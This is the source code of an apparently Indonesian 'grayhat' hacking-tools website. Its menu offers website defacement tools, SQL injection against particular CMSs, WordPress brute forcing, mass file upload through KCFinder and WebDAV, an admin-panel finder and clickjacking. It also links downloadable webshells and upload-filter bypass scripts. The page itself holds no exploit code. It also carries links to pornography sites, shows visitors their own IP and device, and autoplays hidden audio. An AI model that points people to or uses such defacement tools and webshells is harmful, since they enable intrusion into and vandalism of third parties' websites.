    <!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
            <!-- ===== CSS ===== -->
            <link rel="stylesheet" href="assets/css/styles.css">
            
            <title>Tools online grayhat</title>
        </head>
        <body id="body-pd">
            <div class="l-navbar" id="navbar">
                <nav class="nav">
                    <div>
                        <div class="nav__brand">
                            <ion-icon name="menu-outline" class="nav__toggle" id="nav-toggle"></ion-icon>
                            <a href="index.html" class="nav__logo">MENU</a>
                        </div>
                        <div class="nav__list">
                            <a href="#" class="nav__link active">
                           <ion-icon name="home-sharp"></ion-icon>
                                <span class="nav__name">Dashboard</span>
                            </a>
                            <a href="contack.php" class="nav__link">
                          <ion-icon name="call-sharp"></ion-icon>
                                <span class="nav__name">Contack</span>
                            </a>
    
                            <div  class="nav__link collapse">
                         <ion-icon name="skull-sharp"></ion-icon>
                              
                                <span class="nav__name">Defacer</span>
                          <ion-icon name="chevron-down-outline" class="collapse__link"></ion-icon>
    
                              
                              
                                <ul class="collapse__menu">
  
                                    <a href="jso.php" class="collapse__sublink">jso</a>
                                 
                                   <a href="csrf.php" class="collapse__sublink">csrf.online</a>  
  
                                  <a href="devace generator.php" class="collapse__sublink">deface.generator</a>           <a href="balitbang sql.php" class="collapse__sublink">sql.balitbang</a>               <a href="wpbf.php" class="collapse__sublink">wpbf</a>
                                                        <a href="kcmass.php" class="collapse__sublink">kcfinder.mass</a>               <a href="sql loko.php" class="collapse__sublink">sql.lokomedia</a>
  
                                 <a href="webdav mass.php" class="collapse__sublink">webdav.mass</a>
                                </ul>
                            </div>
                                                     <div  class="nav__link collapse">
                              <ion-icon name="code-slash-outline"></ion-icon>
                              
                                <span class="nav__name">Programming</span>
                          <ion-icon name="chevron-down-outline" class="collapse__link"></ion-icon>
    
                              
                              
                                <ul class="collapse__menu">
  
                                     <a href="md5.php" class="collapse__sublink">md5</a> 
                                  <a href="base64.php" class="collapse__sublink">base64</a>          
                                                        <a href="Obfuscator.php" class="collapse__sublink">obfuscator</a>        
                                  <a href="Base64 IMG Encode.php" class="collapse__sublink">img.encode.php</a>                             
                                    </ul>
                                   </div> 
                     <div  class="nav__link collapse">
                             <ion-icon name="earth-sharp"></ion-icon>
                              
                                <span class="nav__name">Website.tools</span>
                          <ion-icon name="chevron-down-outline" class="collapse__link"></ion-icon>
    
                              
                              
                                <ul class="collapse__menu">
  
                                 <a href="dns.php" class="collapse__sublink">dns.lockup</a>
                                 <a href="click jacking.html" class="collapse__sublink">click.jacking</a>           <a href="ip tracker.php" class="collapse__sublink">ip.tracker</a>
                            <a href="Adminfin.php" class="collapse__sublink">Admin.finder</a>      
                              </ul>
                              </div>
                                                        <div  class="nav__link collapse">
                       <ion-icon name="add-sharp"></ion-icon>
                              
                                <span class="nav__name">Extra.tools</span>
                          <ion-icon name="chevron-down-outline" class="collapse__link"></ion-icon>
    
                              
                              
                                <ul class="collapse__menu">
  
                               <a href="kalkulator.html" class="collapse__sublink">kalkulator</a> 
                                    <a href="bot tulis.php" class="collapse__sublink">bot.tulis</a            
                            </ul>
                            </div>
                                                                                   <div  class="nav__link collapse">
                      <ion-icon name="caret-forward-circle-sharp"></ion-icon>
                              
                                <span class="nav__name">Bokep</span>
                          <ion-icon name="chevron-down-outline" class="collapse__link"></ion-icon>
    
                              
                              
                                <ul class="collapse__menu">
  
                             <a href="https://www.porndron.com/">xnxx</a>

                                 <a href="https://brazzers-porn.com/">brazzer</a>

                             <a href="http://en.porn-hub.pro/">pornhub</a>
   
                             <a href="https://fullxh.com/channels/brazzers/4">xhamster</a>         
                            </ul>
                            </div>
                           
                                           </ul>
                                   </div> 
                     <div  class="nav__link collapse">
                           <ion-icon name="cloud-download-sharp"></ion-icon>
                              
                                <span class="nav__name">Download.shell</span>
                          <ion-icon name="chevron-down-outline" class="collapse__link"></ion-icon>
    
                              
                              
                                <ul class="collapse__menu">
  
                                       <a href="https://github.com/0x5a455553/MARIJUANA/archive/master.zip">marijuana.shell</a>

                                 <a href="https://pastebin.com/dl/x7wppDqx">mini.shell</a>

                             <a href="https://pastebin.com/raw/XUuajUpL">bypass.images</a>
   
                             <a href="https://pastebin.com/raw/WbH0TphN">bypass.forbiden</a>         
                              </ul>
                              </div>
                              
                            <a href="about/index.html" class="nav__link">
                              <ion-icon name="body-sharp"></ion-icon>
                                <span class="nav__name">About</span>
                            </a>
                    </a>
                </nav>
            </div>
  <!DOCTYPE html>
  <html>
  <head>
  	<!-- Menampilkan Jam (Aktif) -->
  	<div id="clock"></div>
  		<script type="text/javascript">
  		<!--
  		function showTime() {
  		    var a_p = "";
  		    var today = new Date();
  		    var curr_hour = today.getHours();
  		    var curr_minute = today.getMinutes();
  		    var curr_second = today.getSeconds();
  		    if (curr_hour < 12) {
  		        a_p = "AM";
  		    } else {
  		        a_p = "PM";
  		    }
  		    if (curr_hour == 0) {
  		        curr_hour = 12;
  		    }
  		    if (curr_hour > 12) {
  		        curr_hour = curr_hour - 12;
  		    }
  		    curr_hour = checkTime(curr_hour);
  		    curr_minute = checkTime(curr_minute);
  		    curr_second = checkTime(curr_second);
  		 document.getElementById('clock').innerHTML=curr_hour + ":" + curr_minute + ":" + curr_second + " " + a_p;
  		    }
   
  		function checkTime(i) {
  		    if (i < 10) {
  		        i = "0" + i;
  		    }
  		    return i;
  		}
  		setInterval(showTime, 500);
  		//-->
  		</script>
   
  		<!-- Menampilkan Hari, Bulan dan Tahun -->
  		<script type='text/javascript'>
  			<!--
  			var months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
  			var myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jum&#39;at', 'Sabtu'];
  			var date = new Date();
  			var day = date.getDate();
  			var month = date.getMonth();
  			var thisDay = date.getDay(),
  			    thisDay = myDays[thisDay];
  			var yy = date.getYear();
  			var year = (yy < 1000) ? yy + 1900 : yy;
  			document.write(thisDay + ', ' + day + ' ' + months[month] + ' ' + year);
  			//-->
  		</script>
   
  </body>
  </html>
  <?php 
  require('UserInfo.php');
  ?>
  	<style>
  table {
  	margin-top: 20px;
      font-family: arial, sans-serif;
      border-collapse: collapse;
      width: 100%;
  }
  
  td, th {
      border: 1px solid #dddddd;
      text-align: center;
      padding: 8px;
  }
  
  tr:nth-child(even) {
      background-color: #dddddd;
  }
  h2{font-family: sans-serif,'Helvetica';}
  </style>
  <HR>
  </head>
  <body>
    <table>
  
  	<table>
  		<tr>
  			<th>Ip</th>
  			<th>Device</th>
  			<th>Pengunjung</th>
  			<th>Browser</th>
  		</tr>
  		<tr>
  			<td><?= UserInfo::get_ip();?></td>
  			<td><?= UserInfo::get_device();?></td>
  			<td><!-- hitwebcounter Code START -->
  <a href="https://www.hitwebcounter.com" target="_blank">
  <img src="https://hitwebcounter.com/counter/counter.php?page=7727882&style=0032&nbdigits=5&type=page&initCount=0" title="Total Website Hits" Alt="Web Hits"   border="0" /></a>                                    
                                      </td>
  			<td><?= UserInfo::get_browser();?></td>
  		</tr>
  	</table>
         
         
          <center><img src="https://h.top4top.io/p_18041tr110.jpg"width="400"height="400">
          <center><font size="1"><b>Copyright © 2020 mr.croot</b>
        <center><font face="Times New Roman"></font></center>
            <!-- ===== IONICONS ===== -->
            <script src="https://unpkg.com/ionicons@5.1.2/dist/ionicons.js"></script>
            
            <!-- ===== MAIN JS ===== -->
            <script src="assets/js/main.js"></script>
           <iframe widllth="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://e.top4top.io/m_1805h5dn70.mp3"></iframe>
        </body>
    </html>